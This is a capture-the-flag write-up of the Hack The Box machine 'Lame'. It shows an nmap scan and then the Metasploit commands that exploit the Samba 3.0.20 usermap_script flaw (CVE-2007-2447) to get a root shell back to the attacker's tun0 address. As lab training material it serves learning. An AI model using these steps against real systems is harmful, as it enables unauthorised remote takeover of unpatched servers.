---
description: Walkthrough of the HTB machine "Lame"
cover: >-
  https://images.unsplash.com/photo-1625768375325-ce6bdd4a2329?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwxMHx8bGFtZXxlbnwwfHx8fDE3MDk4NTk2NTV8MA&ixlib=rb-4.0.3&q=85
coverY: 17
---

# 😒 Lame (10.10.10.3)

## Scanning

### Nmap

Let's start with the usual Nmap scan:

```bash
nmap -T4 -A 10.10.10.3 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 21:09 -03
Nmap scan report for 10.10.10.3
Host is up (0.16s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h30m00s, deviation: 3h32m10s, median: -1s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-03-07T19:09:37-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
```

## Enumeration

As we can see, Port 21 is running FTP on VSFTPD v2.3.4, which is a vulnerable version that allows for Backdoor Command Execution, a vulnerability portraited by [CVE-2011-2523](https://www.exploit-db.com/exploits/49757).

However, in this case, the exploit won't work. This is due to the fact that there's a Firewall on the target blocking these connections. A more detailed explanation can be found [here](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd). That being said, we should take another route.

If we take a look at the SMB Version on the target, we can see that it is running SMB v3.0.20. This version is vulnerable to [CVE-2007-2447](https://www.exploit-db.com/exploits/16320), which is exploitable by a Metasploit module that allows for Command Execution.

So we can search for this exploit on "_msfconsole_":

```bash
msf6 > search username map
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Exploit for SMB v3.0.20 on Metasploit</p></figcaption></figure>

## Exploitation

Now we just setup our options:

{% code overflow="wrap" %}
```bash
# First, we'll setup our "rhosts", which is our target's IP
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3

# Next, we set our "lhost" to our IP, which, once connected to HTB's VPN should be your "tun0"
msf6 exploit(multi/samba/usermap_script) > set lhost tun0

# Then, run
msf6 exploit(multi/samba/usermap_script) > run
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>We have Root</p></figcaption></figure>

### User Flag

The "user.txt" flag is located in /home/makis/user.txt:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>User Flag</p></figcaption></figure>

### Root Flag

The "root.txt" flag is located in /root/root.txt:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Root Flag</p></figcaption></figure>

And this was the CTF!&#x20;

Thank you so much for taking the time to read my WriteUp!

See you in another box!
